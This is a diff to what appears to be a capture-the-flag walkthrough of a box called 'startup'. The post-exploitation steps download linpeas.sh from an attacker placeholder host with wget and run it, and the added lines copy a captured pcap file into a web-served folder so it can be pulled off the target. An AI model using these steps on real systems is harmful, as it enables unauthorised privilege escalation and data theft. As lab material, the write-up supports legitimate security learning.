@@ -102,7 +102,15 @@ cd /tmp
 wget http://LHOST-IP:53/linpeas.sh
 chmod +x linpeas.sh
 ```
-Now lest run Linpeas
+Now lets run Linpeas
 ```
 www-data@startup:/tmp$ ./linpeas.sh
+```
+Here we can se a suspicius file **/incidents/suspicious.pcapng**
+Transfere the file to the LHOST using the FTP folder.
+```
+Copy file to HTTP/FTP folder. 
+cp /incidents/suspicious.pcapng /var/www/html/files/ftp/
+Dowload the file from: 
+http://RHOST/files/ftp/suspicius.pcapng
 ```
